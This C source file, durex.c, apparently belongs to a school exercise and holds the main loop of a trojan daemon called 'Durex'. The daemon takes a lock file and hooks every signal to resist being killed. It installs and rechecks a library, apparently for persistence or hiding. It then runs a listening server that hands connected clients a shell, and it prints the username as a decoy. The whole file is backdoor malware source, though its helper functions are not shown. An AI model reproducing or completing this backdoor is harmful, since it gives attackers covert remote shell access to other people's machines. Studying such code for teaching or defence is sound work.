/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/07/15 02:43:33 by root              #+#    #+#             */
/*   Updated: 2018/10/01 09:28:58 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* signal */
#include <signal.h>
/* remove */
#include <stdio.h>
/* exit */
#include <stdlib.h>
/* getpwuid */
#include <sys/types.h>
#include <pwd.h>
/* time */
#include <time.h>
/* errno */
#include <errno.h>

#include "main.h"
#include "durex.h"

static void			cleanStructure()
{
	e.lock = -1;
	e.server.reporter = -1;
	e.server.fd = -1;
	mymemset(&e.server.fdr, 0, sizeof(e.server.fdr));
	mymemset(&e.server.fdw, 0, sizeof(e.server.fdw));
	for (int i = 0; i < SERVER_CLIENT_MAX; i++)
		clearClient(&e.server.client[i]);
}

static int			launch_program()
{
	e.lock = open(DUREX_LOCK_FILE, O_CREAT | O_WRONLY, 0600);
	if (e.lock < 0)
		return 0;
	if (flock(e.lock, LOCK_EX | LOCK_NB))
		return 0;
	for (int i = 0; i < NSIG; i++) {
		signal(i, &durexSigterm);
	}
	return 1;
}

static int			setupSelect()
{
	int				i;
	int				max;

	FD_ZERO(&e.server.fdr);
	FD_ZERO(&e.server.fdw);
	FD_SET(e.server.fd, &e.server.fdr);
	max = e.server.fd;
	i = 0;
	while (i < SERVER_CLIENT_MAX)
	{
		if (e.server.client[i].fd != -1) {
			if (e.server.client[i].fd > max)
				max = e.server.client[i].fd;
			FD_SET(e.server.client[i].fd, &e.server.fdr);
			FD_SET(e.server.client[i].fd, &e.server.fdw);
			if (e.server.client[i].shell != -1) {
				if (e.server.client[i].shell > max)
					max = e.server.client[i].shell;
				FD_SET(e.server.client[i].shell, &e.server.fdr);
			}
		}
		i++;
	}
	return max;
}

void				durex()
{
	int				maxfd;
	int				ret;
	struct timeval	timeout;

	cleanStructure();
	if (launch_program() && hireReporter() && install_library()) {
		serverLog("[LOGS] - Opening Server...");
		e.server.fd = openServer(SERVER_ADDR, SERVER_PORT);
		serverLog("[LOGS] - Waiting for connections...");
		mymemset(&timeout, 0, sizeof(timeout));
		while (1)
		{
			maxfd = setupSelect();
			ret = select(maxfd + 1, &e.server.fdr, &e.server.fdw, NULL, &timeout);
			if (ret == -1 && errno != EINTR) {
				serverLog("[ERRO] - %s", strerror(errno));
				break ;
			}
			if (FD_ISSET(e.server.fd, &e.server.fdr))
				serverAcceptConnections();
			for (int i = 0; i < SERVER_CLIENT_MAX; i++)
			{
				if (e.server.client[i].fd == -1)
					continue ;
				if (FD_ISSET(e.server.client[i].fd, &e.server.fdr))
					serverReadClient(&e.server.client[i]);
				if (FD_ISSET(e.server.client[i].fd, &e.server.fdw))
					serverWriteClient(&e.server.client[i]);
				if (FD_ISSET(e.server.client[i].shell, &e.server.fdr))
					serverReadClientShell(&e.server.client[i]);
			}
			check_library();
		}
		serverLog("Hm...");
		uninstall_library();
		quitClearlyServer();
		quitClearlyDaemon();
	}
	struct passwd	*passwd;
	passwd = getpwuid(getuid());
	write(STDIN_FILENO, passwd->pw_name, mystrlen(passwd->pw_name));
	write(STDIN_FILENO, "\n", 1);
}

void			quitClearlyDaemon()
{
	flock(e.lock, LOCK_UN);
	close(e.lock);
	remove(DUREX_LOCK_FILE);
	exit(0);
}
